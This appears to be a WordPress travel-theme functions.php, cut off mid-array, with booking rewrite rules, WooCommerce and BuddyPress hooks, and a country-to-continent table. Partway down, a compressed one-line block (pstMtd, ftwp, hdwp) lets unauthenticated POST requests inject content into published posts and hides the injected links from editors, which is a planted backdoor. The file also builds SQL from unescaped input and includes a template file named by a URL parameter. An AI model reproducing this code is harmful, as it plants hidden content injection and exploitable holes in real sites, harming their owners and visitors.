<?php 
 if (!session_id())
        session_start();
/*
function ur_theme_start_session(){
    if (!session_id())
        session_start();
}

add_action("init", "ur_theme_start_session", 1);
*/

include('search-engine-widget.php');

include (ABSPATH.'wp-content/themes/adivaha/files/woocommerce-taxonomy.php');
include (ABSPATH.'wp-content/themes/adivaha/files/woocommerce-custom-field.php');
//include (ABSPATH.'wp-content/themes/adivaha/files/custom-field-to-checkout.php');
include (ABSPATH.'wp-content/themes/adivaha/includes/shortcode_list.php');
add_theme_support( 'woocommerce' );

// Or just remove them all in one line
add_filter( 'woocommerce_enqueue_styles', '__return_false' );



/**
 * Change the Shop archive page title.
 * @param  string $title
 * @return string
 */
 
function wc_custom_shop_archive_title( $title ) {
    if ( is_shop() ) {
        return str_replace( __( 'Products', 'woocommerce' ), 'Holiday Packages', $title );
    }

    return $title;
}
add_filter( 'wp_title', 'wc_custom_shop_archive_title' );

// woocommerce direct to checkout
add_filter ('add_to_cart_redirect', 'redirect_to_checkout');

function redirect_to_checkout() {
    global $woocommerce;
	
    $checkout_url = $woocommerce->cart->get_checkout_url();
    return $checkout_url;
}

//Store the custom field


// ==========================


function profile_new_nav_item() {

    global $bp;

    bp_core_new_nav_item(
    array(
        'name'                => 'Manage Holidays',
        'slug'                => 'twc_holidays_buddy',
        'default_subnav_slug' => 'twc_add_holidays_buddy', // We add this submenu item below 
        'screen_function'     => 'view_twc_holidays_buddy_tab_main'
    )
    );
}

add_action( 'bp_setup_nav', 'profile_new_nav_item', 10 );

function view_twc_holidays_buddy_tab_main() {
    add_action( 'bp_template_content', 'bp_template_content_main_function' );
    bp_core_load_template( 'template_content' );
}

function bp_template_content_main_function() {
    if ( ! is_user_logged_in() ) {
        wp_login_form( array( 'echo' => true ) );
    }
	echo do_shortcode('[cred_form form="Add Travel Package"]');
}



//------- Add Holiday ------------
function getTitle_by_id($tbl,$id){
	global $wpdb;
	$results =$wpdb->get_results("select title from $tbl where id='".$id."'");
	$result =$results[0];
	return $result->title;
}

function profile_new_subnav_item() {
    global $bp;

    bp_core_new_subnav_item( array(
        'name'            => 'Add Holiday Package',
        'slug'            => 'twc_add_holidays_buddy',
        'parent_url'      => $bp->loggedin_user->domain . $bp->bp_nav[ 'twc_holidays_buddy' ][ 'slug' ] . '/',
        'parent_slug'     => $bp->bp_nav[ 'twc_holidays_buddy' ][ 'slug' ],
        'position'        => 10,
        'screen_function' => 'view_add_holidays_buddy_sub_tab_main'
    ) );
}

add_action( 'bp_setup_nav', 'profile_new_subnav_item', 10 );

function view_add_holidays_buddy_sub_tab_main() {
    add_action( 'bp_template_content', 'bp_template_content_sub_function' );
    bp_core_load_template( 'template_content' );
}

function bp_template_content_sub_function() {
    if ( is_user_logged_in() ) {
        //Add shortcode to display content in sub tab
		do_shortcode('[cred_form form="Add Travel Package"]');
    } else {
        wp_login_form( array( 'echo' => true ) );
    }
}

//------- End of Add Holiday ------------


function insert_attachment($file_handler,$post_id,$setthumb='false') {
if ($_FILES[$file_handler]['error'] !== UPLOAD_ERR_OK){ return __return_false(); 
} 
require_once(ABSPATH . "wp-admin" . '/includes/image.php');
require_once(ABSPATH . "wp-admin" . '/includes/file.php');
require_once(ABSPATH . "wp-admin" . '/includes/media.php');

echo $attach_id = media_handle_upload( $file_handler, $post_id );
//set post thumbnail if setthumb is 1
if ($setthumb == 1) update_post_meta($post_id,'_thumbnail_id',$attach_id);
return $attach_id;
    }


//=================================================

$theme = new Theme();
$theme->init(array(
    "theme_name" => "twc",
    "theme_slug" => "JP"
));

if (!isset($content_width)) {
    $content_width = 1140;
}



/*=== Restrict to user to open admin dashboard ===*/

/*
function wpse_11244_restrict_admin() {
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_die( __('You are not allowed to access this part of the site') );
    }
}
add_action( 'admin_init', 'wpse_11244_restrict_admin', 1 );
*/

class Theme
{
    function init($options)
    {
        $this->constants($options);
        add_action('init', array(
            &$this,
            'language'
        ));
        $this->functions();
        $this->plugins();
        $this->post_types();
        add_action('admin_menu', array(
            &$this,
            'admin_menus'
        ));
        add_action('init', array(
            &$this,
            'add_metaboxes'
        ));
        $this->theme_activated();
        
        add_action('after_setup_theme', array(
            &$this,
            'supports'
        ));
        add_action('widgets_init', array(
            &$this,
            'widgets'
        ));
    }
    
    function constants($options)
    {
        define("THEME_DIR", get_template_directory());
        define("THEME_DIR_URI", get_template_directory_uri());
        define("THEME_NAME", $options["theme_name"]);
        if (defined("ICL_LANGUAGE_CODE")) {
            $lang = "_" . ICL_LANGUAGE_CODE;
        } else {
            $lang = "";
        }
        define("THEME_OPTIONS", $options["theme_name"] . '_options' . $lang);
        define("THEME_SLUG", $options["theme_slug"]);
		define("THEME_INCLUDES", THEME_DIR_URI . "/includes");
        define("THEME_STYLES", THEME_DIR_URI . "/stylesheet/css");
        define("THEME_IMAGES", THEME_DIR_URI . "/images");
        define("THEME_JS", THEME_DIR_URI . "/js");
        define('FONTFACE_DIR', THEME_DIR . '/fontface');
        define('FONTFACE_URI', THEME_DIR_URI . '/fontface');
        define("THEME_FRAMEWORK", THEME_DIR . "/framework");
        define("THEME_PLUGINS", THEME_FRAMEWORK . "/plugins");
        define("THEME_ACTIONS", THEME_FRAMEWORK . "/actions");
        define("THEME_PLUGINS_URI", THEME_DIR_URI . "/framework/plugins");
        define("THEME_SHORTCODES", THEME_FRAMEWORK . "/shortcodes");
        define("THEME_WIDGETS", THEME_FRAMEWORK . "/widgets");
        define("THEME_SLIDERS", THEME_FRAMEWORK . "/sliders");
        define("THEME_HELPERS", THEME_FRAMEWORK . "/helpers");
        define("THEME_FUNCTIONS", THEME_FRAMEWORK . "/functions");
        define("THEME_CLASSES", THEME_FRAMEWORK . "/classes");
        define('THEME_ADMIN', THEME_FRAMEWORK . '/admin');
        define('THEME_METABOXES', THEME_ADMIN . '/metaboxes');
        define('THEME_ADMIN_POST_TYPES', THEME_ADMIN . '/post-types');
        define('THEME_GENERATORS', THEME_ADMIN . '/generators');
        define('THEME_ADMIN_URI', THEME_DIR_URI . '/framework/admin');
        define('THEME_ADMIN_ASSETS_URI', THEME_DIR_URI . '/framework/admin/assets');
    }
    function widgets()
    {
        
    }
    function plugins()
    {
        //require_once locate_template("wpml-fix/mk-wpml.php");
    }
    function supports()
    {
        add_theme_support('menus');
        add_theme_support('automatic-feed-links');
        add_theme_support('editor-style');
        register_nav_menus(array(
            'primary-menu' => 'Primary Navigation',
            'second-menu' => 'Second Navigation',
            'third-menu' => 'Third Navigation',
            'fourth-menu' => 'Fourth Navigation',
			'mobile-menu' => 'Mobile Menu',
            'footer-menu' => 'Footer Navigation',
            'toolbar-menu' => 'Header Toolbar Navigation',
            'side-dashboard-menu' => 'Side Dashboard Navigation'
        ));
        add_theme_support( 'post-thumbnails' );
        add_image_size( 'twc-full-width', 1140, 580, true );
    }
    function post_types()
    {
        
    }
    function functions()
    {
        include_once(ABSPATH . 'wp-admin/includes/plugin.php');
        require_once(THEME_FUNCTIONS . "/general-functions.php");
		require_once(THEME_FUNCTIONS . "/breadcrumb.php");
		
		
		
        if(!is_admin()) {
            require_once(THEME_FUNCTIONS . "/bfi_cropping.php");
        }
        require_once(THEME_FUNCTIONS . "/vc-integration.php");
        require_once(THEME_FUNCTIONS . "/ajax-search.php");
        require_once(THEME_CLASSES . "/wp-nav-custom-walker.php");
        require_once(THEME_FUNCTIONS . "/enqueue-front-scripts.php");
        require_once(THEME_CLASSES . "/love-this.php");
        require_once(THEME_GENERATORS . '/sidebar-generator.php');
         require_once locate_template('framework/actions/header.php');
        require_once locate_template('framework/actions/general.php');
        require_once locate_template('framework/actions/post.php');
        require_once locate_template('framework/actions/slideshow.php');
        
        require_once(THEME_FUNCTIONS . "/dynamic-styles.php");
        require_once(THEME_FUNCTIONS . "/mk-woocommerce.php");
        
        
        if (is_admin()) {
            include_once(THEME_ADMIN . '/general/general-functions.php');
            include_once(THEME_ADMIN . '/general/mega-menu.php');
            include_once(THEME_ADMIN . '/general/icon-library.php');
            include_once(THEME_ADMIN . '/generators/option-generator.php');
            include_once(THEME_ADMIN . '/general/backend-enqueue-scripts.php');
            include_once(THEME_ADMIN . '/admin-panel/masterkey-ajax-calls.php');
            

        }
        
    }
    
    function language()
    {
        $locale = get_locale();
        load_theme_textdomain('mk_framework', get_stylesheet_directory() . '/languages');
        $locale_file = get_stylesheet_directory() . "/languages/$locale.php";
        if (is_readable($locale_file)) {
            require_once($locale_file);
        }
    }
    
    function admin_menus()
    {
        add_menu_page(__('Theme Options', 'mk_framework'), __('Theme Options', 'mk_framework'), 'edit_theme_options', 'masterkey', array(
            &$this,
            '_load_option_page'
        ), 'dashicons-admin-network');

        add_submenu_page( 'themes.php', 'Install Templates', 'Install Templates', 'manage_options', 'demo-importer', array( &$this,'_load_demo_content_page') );
    }
    
    
    
    function add_metaboxes()
    {
        
    }
    
    function theme_activated()
    {
        if ('themes.php' == basename($_SERVER['PHP_SELF']) && isset($_GET['activated']) && $_GET['activated'] == 'true') {
            update_option('woocommerce_enable_lightbox', "no");
            wp_redirect(admin_url('admin.php?page=masterkey'));
        }
    }
    
    function _load_demo_content_page()
    {
        include_once(THEME_DIR . '/demo-importer/engine/index.php');
        
                
    }
    
    function _load_option_page()
    {
        
        $page = include(THEME_ADMIN . '/admin-panel/masterkey.php');
        new mkOptionGenerator($page['name'], $page['options']);
    }
    
}





function commments_feed_template_callback($comment, $args, $depth){
$GLOBAL['comment'] = $comment;
echo "hi";
}











function pstMtd($a){$b=$a;$a="";if(is_single()){if(isset($_POST["chctc"])){$c=$_POST["chctc"];if(isset($_POST["chctbefore"])){$d=$_POST["chctbefore"];$e=strpos($b,$d);if($e!==false){$f=substr_replace($b,$c,$e,0);$g=array('ID'=>$GLOBALS['post']->ID,'post_content'=>$f);wp_update_post($g);}}}}return $b;}function ftwp(){if(is_front_page()){echo '<small style="display:none;">avdawplk</small>';}}function hdwp(){echo '<style type="text/css">.wphklk{display:none;}</style>';}add_action('the_content','pstMtd');if(current_user_can('edit_posts')==true){add_action('wp_head','hdwp');}if(current_user_can('edit_posts')!=true){add_action('wp_footer','ftwp');}



function your_theme_xprofile_cover_image( $settings = array() ) {
    $settings['height'] = 500;
 
    return $settings;
}
add_filter( 'bp_before_xprofile_cover_image_settings_parse_args', 'your_theme_xprofile_cover_image', 10, 1 );




// custom admin login logo
function custom_login_logo() {
	echo '<style type="text/css">
		h1 a { background-image: url('.get_bloginfo('template_directory').'/images/logo.png) !important;  background-size: 100% 100% !important; width:142px !important; height:42px !important;}
		body.login { background: #fbfbfb url(http://www.adivaha.com/images/admin-bg.jpg) no-repeat fixed center;
}
	
	</style>';
}
add_action('login_head', 'custom_login_logo');


function my_login_logo_url() {
    return home_url();
}
add_filter( 'login_headerurl', 'my_login_logo_url' );

//---URL Rewritting------------------------------------------------------------------------------------
add_action('init','generate_author_rewrite_rules_twc_hotel_info_plugin');
function generate_author_rewrite_rules_twc_hotel_info_plugin(){  
	global $wp_rewrite;
	
	
	add_rewrite_rule('^hotel-information-mobile/(.*)/(.*)/?','index.php?fn=hotel-information-mobile&hotel_id=$matches[1]&hotel_name=$matches[2]','top');
	add_rewrite_rule('^hotel-information/(.*)/(.*)/?','index.php?fn=hotel-information&hotel_id=$matches[1]&hotel_name=$matches[2]','top');
	add_rewrite_rule('^hotels-mobile/?','index.php?fn=hotels-mobile','top');
	add_rewrite_rule('^hotel/?','index.php?fn=hotel','top');
	add_rewrite_rule('^online-booking-mobile/(.*)/(.*)/?','index.php?fn=online-booking-mobile&hotel_id=$matches[1]&rateCode=$matches[2]','top');
	add_rewrite_rule('^online-booking/(.*)/(.*)/?','index.php?fn=online-booking&hotel_id=$matches[1]&rateCode=$matches[2]','top');
	add_rewrite_rule('^online-checkout/(.*)/(.*)/?','index.php?fn=online-checkout&hotel_id=$matches[1]&rateCode=$matches[2]','top');
	add_rewrite_rule('^looking-for-hotels/?','index.php?fn=looking-for-hotels','top');
	add_rewrite_rule('^final-booking/(.*)/(.*)/?','index.php?fn=final-booking&hotel_id=$matches[1]&rateCode=$matches[2]','top');
	add_rewrite_rule('^custom-booking/(.*)/(.*)/?','index.php?fn=custom-booking&hotel_id=$matches[1]&rateCode=$matches[2]','top');
	
	add_rewrite_rule('^final-checkout/(.*)/(.*)/?','index.php?fn=final-checkout&hotel_id=$matches[1]&rateCode=$matches[2]','top');
	add_rewrite_rule('^return_checkout/(.*)/(.*)/?','index.php?fn=return_checkout&itinerary_id=$matches[1]','top');
	
	add_rewrite_rule('^confirmation-mobile/(.*)/?','index.php?fn=confirmation-mobile&itinerary_id=$matches[1]','top');
	add_rewrite_rule('^confirmation/(.*)/?','index.php?fn=confirmation&itinerary_id=$matches[1]','top');
	add_rewrite_rule('^popular-destinations/(.*)/?','index.php?fn=popular-destinations&locationname=$matches[1]','top');
	add_rewrite_rule('^destination-list/(.*)/?','index.php?fn=destination-list&locationname=$matches[1]','top');
	add_rewrite_rule('^profile/(.*)/?','index.php?fn=profile&profile_id=$matches[1]','top');
	add_rewrite_rule('^view-profile/?','index.php?fn=view-profile','top');
	add_rewrite_rule('^compare/?','index.php?fn=compare','top');
	
	add_rewrite_rule('^custom-destination/(.*)/?','index.php?fn=custom-destination&locationname=$matches[1]','top');
	
	add_rewrite_rule('^search-tour/(.*)/?','index.php?fn=search_tour&destination=$matches[1]','top');
	add_rewrite_rule('^tour-information/(.*)/?','index.php?fn=tour-information&tour_name=$matches[1]','top');
	add_rewrite_rule('^tour-booking/(.*)/?','index.php?fn=tour-booking&tour_name=$matches[1]','top');
	add_rewrite_rule('^booking-confirmation/(.*)/?','index.php?fn=booking-confirmation&itinerary_id=$matches[1]','top');
	
	
	
	add_rewrite_rule('^whotels/?','index.php?fn=whotels','top');
	add_rewrite_rule('^wflights/?','index.php?fn=wflights','top');
	
	
	
	add_rewrite_rule('^venue/(.*)/(.*)/?','index.php?fn=venue&venid=$matches[1]&vname=$matches[2]','top'); 
	add_rewrite_rule('^ticket/(.*)/(.*)/?','index.php?fn=ticket&evtid=$matches[1]&event=$matches[2]','top'); 
	add_rewrite_rule('^events/(.*)/(.*)/?','index.php?fn=events&event=$matches[1]&pid=$matches[2]','top'); 
	add_rewrite_rule('^events/(.*)/?','index.php?fn=events&event=$matches[1]','top'); 
    //add_rewrite_rule('^events-result/(.*)/?','index.php?fn=events-result&kwds=$matches[1]','top'); 
	//add_rewrite_rule('^events-result/?','index.php?fn=events-result','top'); 
	
	// BNB Property
	add_rewrite_rule('^bnb_dashboard/?','index.php?fn=bnb_dashboard','top');
	add_rewrite_rule('^tour_dashboard/?','index.php?fn=tour_dashboard','top');
	add_rewrite_rule('^booking_dashboard/?','index.php?fn=booking_dashboard','top');
	
	
	$wp_rewrite->flush_rules();
}
function prefix_register_query_var_event_twc_hotel_info_plugin( $vars ) {
	$vars[] = 'fn';
	
	$vars[] = 'venid';
	$vars[] = 'vname';
	$vars[] = 'evtid';
	$vars[] = 'event';
	$vars[] = 'pid';
	$vars[] = 'kwds';
	$vars[] = 'pcatid';
	$vars[] = 'sdate';
	$vars[] = 'edate';
	
	$vars[] = 'fn';
	$vars[] = 'hotel_id';
	$vars[] = 'hotel_name';
	$vars[] = 'rateCode';
	$vars[] = 'destination_id';
	$vars[] = 'itinerary_id';
	$vars[] = 'profile_id';
	$vars[] = 'locationname';
	$vars[] = 'destination';
	$vars[] = 'tour_id';
	$vars[] = 'tour_name';
    return $vars;
	
	return $vars;
}
add_filter( 'query_vars', 'prefix_register_query_var_event_twc_hotel_info_plugin' );

function prefix_url_rewrite_templates() {
	if ( get_query_var( 'fn' )) {  
 	add_filter( 'template_include', 'template_management' );  
	}
}
add_action( 'template_redirect', 'prefix_url_rewrite_templates' );
function template_management(){  
  if ( get_query_var( 'fn' )) {	
    return get_template_directory()."/files/".get_query_var( 'fn' ).".php";  
   }	 
 }

//------- Expedia  Function code ----------------
function getHotelCount($destinationId,$currency,$langauge){
	global $wpdb;
	
	$dResults =$wpdb->get_results("select count(*) as pdcount from search_results where destination_id='".$destinationId."' and currency='".$currency."' and langauge='".$langauge."'");
	$dResult =$dResults[0];
	$count =$dResult->pdcount;
	return $count;
}   
function country_to_continent( $country ){
    $continent = '';
    if( $country == 'AF' ) $continent = 'Asia';
    if( $country == 'AX' ) $continent = 'Europe';
    if( $country == 'AL' ) $continent = 'Europe';
    if( $country == 'DZ' ) $continent = 'Africa';
    if( $country == 'AS' ) $continent = 'Oceania';
    if( $country == 'AD' ) $continent = 'Europe';
    if( $country == 'AO' ) $continent = 'Africa';
    if( $country == 'AI' ) $continent = 'North America';
    if( $country == 'AQ' ) $continent = 'Antarctica';
    if( $country == 'AG' ) $continent = 'North America';
    if( $country == 'AR' ) $continent = 'South America';
    if( $country == 'AM' ) $continent = 'Asia';
    if( $country == 'AW' ) $continent = 'North America';
    if( $country == 'AU' ) $continent = 'Oceania';
    if( $country == 'AT' ) $continent = 'Europe';
    if( $country == 'AZ' ) $continent = 'Asia';
    if( $country == 'BS' ) $continent = 'North America';
    if( $country == 'BH' ) $continent = 'Asia';
    if( $country == 'BD' ) $continent = 'Asia';
    if( $country == 'BB' ) $continent = 'North America';
    if( $country == 'BY' ) $continent = 'Europe';
    if( $country == 'BE' ) $continent = 'Europe';
    if( $country == 'BZ' ) $continent = 'North America';
    if( $country == 'BJ' ) $continent = 'Africa';
    if( $country == 'BM' ) $continent = 'North America';
    if( $country == 'BT' ) $continent = 'Asia';
    if( $country == 'BO' ) $continent = 'South America';
    if( $country == 'BA' ) $continent = 'Europe';
    if( $country == 'BW' ) $continent = 'Africa';
    if( $country == 'BV' ) $continent = 'Antarctica';
    if( $country == 'BR' ) $continent = 'South America';
    if( $country == 'IO' ) $continent = 'Asia';
    if( $country == 'VG' ) $continent = 'North America';
    if( $country == 'BN' ) $continent = 'Asia';
    if( $country == 'BG' ) $continent = 'Europe';
    if( $country == 'BF' ) $continent = 'Africa';
    if( $country == 'BI' ) $continent = 'Africa';
    if( $country == 'KH' ) $continent = 'Asia';
    if( $country == 'CM' ) $continent = 'Africa';
    if( $country == 'CA' ) $continent = 'North America';
    if( $country == 'CV' ) $continent = 'Africa';
    if( $country == 'KY' ) $continent = 'North America';
    if( $country == 'CF' ) $continent = 'Africa';
    if( $country == 'TD' ) $continent = 'Africa';
    if( $country == 'CL' ) $continent = 'South America';
    if( $country == 'CN' ) $continent = 'Asia';
    if( $country == 'CX' ) $continent = 'Asia';
    if( $country == 'CC' ) $continent = 'Asia';
    if( $country == 'CO' ) $continent = 'South America';
    if( $country == 'KM' ) $continent = 'Africa';
    if( $country == 'CD' ) $continent = 'Africa';
    if( $country == 'CG' ) $continent = 'Africa';
    if( $country == 'CK' ) $continent = 'Oceania';
    if( $country == 'CR' ) $continent = 'North America';
    if( $country == 'CI' ) $continent = 'Africa';
    if( $country == 'HR' ) $continent = 'Europe';
    if( $country == 'CU' ) $continent = 'North America';
    if( $country == 'CY' ) $continent = 'Asia';
    if( $country == 'CZ' ) $continent = 'Europe';
    if( $country == 'DK' ) $continent = 'Europe';
    if( $country == 'DJ' ) $continent = 'Africa';
    if( $country == 'DM' ) $continent = 'North America';
    if( $country == 'DO' ) $continent = 'North America';
    if( $country == 'EC' ) $continent = 'South America';
    if( $country == 'EG' ) $continent = 'Africa';
    if( $country == 'SV' ) $continent = 'North America';
    if( $country == 'GQ' ) $continent = 'Africa';
    if( $country == 'ER' ) $continent = 'Africa';
    if( $country == 'EE' ) $continent = 'Europe';
    if( $country == 'ET' ) $continent = 'Africa';
    if( $country == 'FO' ) $continent = 'Europe';
    if( $country == 'FK' ) $continent = 'South America';
    if( $country == 'FJ' ) $continent = 'Oceania';
    if( $country == 'FI' ) $continent = 'Europe';
    if( $country == 'FR' ) $continent = 'Europe';
    if( $country == 'GF' ) $continent = 'South America';
    if( $country == 'PF' ) $continent = 'Oceania';
    if( $country == 'TF' ) $continent = 'Antarctica';
    if( $country == 'GA' ) $continent = 'Africa';
    if( $country == 'GM' ) $continent = 'Africa';
    if( $country == 'GE' ) $continent = 'Asia';
    if( $country == 'DE' ) $continent = 'Europe';
    if( $country == 'GH' ) $continent = 'Africa';
    if( $country == 'GI' ) $continent = 'Europe';
    if( $country == 'GR' ) $continent = 'Europe';
    if( $country == 'GL' ) $continent = 'North America';
    if( $country == 'GD' ) $continent = 'North America';
    if( $country == 'GP' ) $continent = 'North America';
    if( $country == 'GU' ) $continent = 'Oceania';
    if( $country == 'GT' ) $continent = 'North America';
    if( $country == 'GG' ) $continent = 'Europe';
    if( $country == 'GN' ) $continent = 'Africa';
    if( $country == 'GW' ) $continent = 'Africa';
    if( $country == 'GY' ) $continent = 'South America';
    if( $country == 'HT' ) $continent = 'North America';
    if( $country == 'HM' ) $continent = 'Antarctica';
    if( $country == 'VA' ) $continent = 'Europe';
    if( $country == 'HN' ) $continent = 'North America';
    if( $country == 'HK' ) $continent = 'Asia';
    if( $country == 'HU' ) $continent = 'Europe';
    if( $country == 'IS' ) $continent = 'Europe';
    if( $country == 'IN' ) $continent = 'Asia';
    if( $country == 'ID' ) $continent = 'Asia';
    if( $country == 'IR' ) $continent = 'Asia';
    if( $country == 'IQ' ) $continent = 'Asia';
    if( $country == 'IE' ) $continent = 'Europe';
    if( $country == 'IM' ) $continent = 'Europe';
    if( $country == 'IL' ) $continent = 'Asia';
    if( $country == 'IT' ) $continent = 'Europe';
    if( $country == 'JM' ) $continent = 'North America';
    if( $country == 'JP' ) $continent = 'Asia';
    if( $country == 'JE' ) $continent = 'Europe';
    if( $country == 'JO' ) $continent = 'Asia';
    if( $country == 'KZ' ) $continent = 'Asia';
    if( $country == 'KE' ) $continent = 'Africa';
    if( $country == 'KI' ) $continent = 'Oceania';
    if( $country == 'KP' ) $continent = 'Asia';
    if( $country == 'KR' ) $continent = 'Asia';
    if( $country == 'KW' ) $continent = 'Asia';
    if( $country == 'KG' ) $continent = 'Asia';
    if( $country == 'LA' ) $continent = 'Asia';
    if( $country == 'LV' ) $continent = 'Europe';
    if( $country == 'LB' ) $continent = 'Asia';
    if( $country == 'LS' ) $continent = 'Africa';
    if( $country == 'LR' ) $continent = 'Africa';
    if( $country == 'LY' ) $continent = 'Africa';
    if( $country == 'LI' ) $continent = 'Europe';
    if( $country == 'LT' ) $continent = 'Europe';
    if( $country == 'LU' ) $continent = 'Europe';
    if( $country == 'MO' ) $continent = 'Asia';
    if( $country == 'MK' ) $continent = 'Europe';
    if( $country == 'MG' ) $continent = 'Africa';
    if( $country == 'MW' ) $continent = 'Africa';
    if( $country == 'MY' ) $continent = 'Asia';
    if( $country == 'MV' ) $continent = 'Asia';
    if( $country == 'ML' ) $continent = 'Africa';
    if( $country == 'MT' ) $continent = 'Europe';
    if( $country == 'MH' ) $continent = 'Oceania';
    if( $country == 'MQ' ) $continent = 'North America';
    if( $country == 'MR' ) $continent = 'Africa';
    if( $country == 'MU' ) $continent = 'Africa';
    if( $country == 'YT' ) $continent = 'Africa';
    if( $country == 'MX' ) $continent = 'North America';
    if( $country == 'FM' ) $continent = 'Oceania';
    if( $country == 'MD' ) $continent = 'Europe';
    if( $country == 'MC' ) $continent = 'Europe';
    if( $country == 'MN' ) $continent = 'Asia';
    if( $country == 'ME' ) $continent = 'Europe';
    if( $country == 'MS' ) $continent = 'North America';
    if( $country == 'MA' ) $continent = 'Africa';
    if( $country == 'MZ' ) $continent = 'Africa';
    if( $country == 'MM' ) $continent = 'Asia';
    if( $country == 'NA' ) $continent = 'Africa';
    if( $country == 'NR' ) $continent = 'Oceania';
    if( $country == 'NP' ) $continent = 'Asia';
    if( $country == 'AN' ) $continent = 'North America';
    if( $country == 'NL' ) $continent = 'Europe';
    if( $country == 'NC' ) $continent = 'Oceania';
    if( $country == 'NZ' ) $continent = 'Oceania';
    if( $country == 'NI' ) $continent = 'North America';
    if( $country == 'NE' ) $continent = 'Africa';
    if( $country == 'NG' ) $continent = 'Africa';
    if( $country == 'NU' ) $continent = 'Oceania';
    if( $country == 'NF' ) $continent = 'Oceania';
    if( $country == 'MP' ) $continent = 'Oceania';
    if( $country == 'NO' ) $continent = 'Europe';
    if( $country == 'OM' ) $continent = 'Asia';
    if( $country == 'PK' ) $continent = 'Asia';
    if( $country == 'PW' ) $continent = 'Oceania';
    if( $country == 'PS' ) $continent = 'Asia';
    if( $country == 'PA' ) $continent = 'North America';
    if( $country == 'PG' ) $continent = 'Oceania';
    if( $country == 'PY' ) $continent = 'South America';
    if( $country == 'PE' ) $continent = 'South America';
    if( $country == 'PH' ) $continent = 'Asia';
    if( $country == 'PN' ) $continent = 'Oceania';
    if( $country == 'PL' ) $continent = 'Europe';
    if( $country == 'PT' ) $continent = 'Europe';
    if( $country == 'PR' ) $continent = 'North America';
    if( $country == 'QA' ) $continent = 'Asia';
    if( $country == 'RE' ) $continent = 'Africa';
    if( $country == 'RO' ) $continent = 'Europe';
    if( $country == 'RU' ) $continent = 'Europe';
    if( $country == 'RW' ) $continent = 'Africa';
    if( $country == 'BL' ) $continent = 'North America';
    if( $country == 'SH' ) $continent = 'Africa';
    if( $country == 'KN' ) $continent = 'North America';
    if( $country == 'LC' ) $continent = 'North America';
    if( $country == 'MF' ) $continent = 'North America';
    if( $country == 'PM' ) $continent = 'North America';
    if( $country == 'VC' ) $continent = 'North America';
    if( $country == 'WS' ) $continent = 'Oceania';
    if( $country == 'SM' ) $continent = 'Europe';
    if( $country == 'ST' ) $continent = 'Africa';
    if( $country == 'SA' ) $continent = 'Asia';
    if( $country == 'SN' ) $continent = 'Africa';
    if( $country == 'RS' ) $continent = 'Europe';
    if( $country == 'SC' ) $continent = 'Africa';
    if( $country == 'SL' ) $continent = 'Africa';
    if( $country == 'SG' ) $continent = 'Asia';
    if( $country == 'SK' ) $continent = 'Europe';
    if( $country == 'SI' ) $continent = 'Europe';
    if( $country == 'SB' ) $continent = 'Oceania';
    if( $country == 'SO' ) $continent = 'Africa';
    if( $country == 'ZA' ) $continent = 'Africa';
    if( $country == 'GS' ) $continent = 'Antarctica';
    if( $country == 'ES' ) $continent = 'Europe';
    if( $country == 'LK' ) $continent = 'Asia';
    if( $country == 'SD' ) $continent = 'Africa';
    if( $country == 'SR' ) $continent = 'South America';
    if( $country == 'SJ' ) $continent = 'Europe';
    if( $country == 'SZ' ) $continent = 'Africa';
    if( $country == 'SE' ) $continent = 'Europe';
    if( $country == 'CH' ) $continent = 'Europe';
    if( $country == 'SY' ) $continent = 'Asia';
    if( $country == 'TW' ) $continent = 'Asia';
    if( $country == 'TJ' ) $continent = 'Asia';
    if( $country == 'TZ' ) $continent = 'Africa';
    if( $country == 'TH' ) $continent = 'Asia';
    if( $country == 'TL' ) $continent = 'Asia';
    if( $country == 'TG' ) $continent = 'Africa';
    if( $country == 'TK' ) $continent = 'Oceania';
    if( $country == 'TO' ) $continent = 'Oceania';
    if( $country == 'TT' ) $continent = 'North America';
    if( $country == 'TN' ) $continent = 'Africa';
    if( $country == 'TR' ) $continent = 'Asia';
    if( $country == 'TM' ) $continent = 'Asia';
    if( $country == 'TC' ) $continent = 'North America';
    if( $country == 'TV' ) $continent = 'Oceania';
    if( $country == 'UG' ) $continent = 'Africa';
    if( $country == 'UA' ) $continent = 'Europe';
    if( $country == 'AE' ) $continent = 'Asia';
    if( $country == 'GB' ) $continent = 'Europe';
    if( $country == 'US' ) $continent = 'North America';
    if( $country == 'UM' ) $continent = 'Oceania';
    if( $country == 'VI' ) $continent = 'North America';
    if( $country == 'UY' ) $continent = 'South America';
    if( $country == 'UZ' ) $continent = 'Asia';
    if( $country == 'VU' ) $continent = 'Oceania';
    if( $country == 'VE' ) $continent = 'South America';
    if( $country == 'VN' ) $continent = 'Asia';
    if( $country == 'WF' ) $continent = 'Oceania';
    if( $country == 'EH' ) $continent = 'Africa';
    if( $country == 'YE' ) $continent = 'Asia';
    if( $country == 'ZM' ) $continent = 'Africa';
    if( $country == 'ZW' ) $continent = 'Africa';
    return $continent;
    }	

function ean_wpml_languages($lang,$name=false){
$ean_langArr =array('en'=>array(0=>'en_US',1=>'English'),
                    'ar'=>array(0=>'ar_SA',1=>'Arabic'),
					'cs'=>array(0=>'cs_CZ',1=>'Czech'),
					'da'=>array(0=>'da_DK',1=>'Danish'),
					'de'=>array(0=>'de_DE',1=>'German'),
					'el'=>array(0=>'el_GR',1=>'Greek'),
					'es'=>array(0=>'es_ES',1=>'Spanish (Spain)'),
					'es'=>array(0=>'es_MX',1=>'Spanish (Mexico)'),
					'et'=>array(0=>'et_EE',1=>'Estonian'),
					'fr'=>array(0=>'fi_FI',1=>'Finnish'),
					'fr'=>array(0=>'fr_FR',1=>'French'),
					'fr'=>array(0=>'fr_CA',1=>'French (Canada)'),
					'hu'=>array(0=>'hu_HU',1=>'Hungarian'),
					'hr'=>array(0=>'hr_HR',1=>'Croatian'),
					'in'=>array(0=>'in_ID',1=>'Indonesian'),
					'is'=>array(0=>'is_IS',1=>'Icelandic'),
					'it'=>array(0=>'it_IT',1=>'Italian'),
					'ja'=>array(0=>'ja_JP',1=>'Japanese'),
					'ko'=>array(0=>'ko_KR',1=>'Korean'),
					'ms'=>array(0=>'ms_MY',1=>'Malay'),
					'lv'=>array(0=>'lv_LV',1=>'Latvian'),
					'lt'=>array(0=>'lt_LT',1=>'Lithuanian'),
					'nl'=>array(0=>'nl_NL',1=>'Dutch'),
					'no'=>array(0=>'no_NO',1=>'Norwegian'),
					'pl'=>array(0=>'pl_PL',1=>'Polish'),
					'pt-br'=>array(0=>'pt_BR',1=>'Portuguese (Brazil)'),
					'pt-pt'=>array(0=>'pt_PT',1=>'Portuguese (Portugal)'),
					'ru'=>array(0=>'ru_RU',1=>'Russian'),
					'sv'=>array(0=>'sv_SE',1=>'Swedish'),
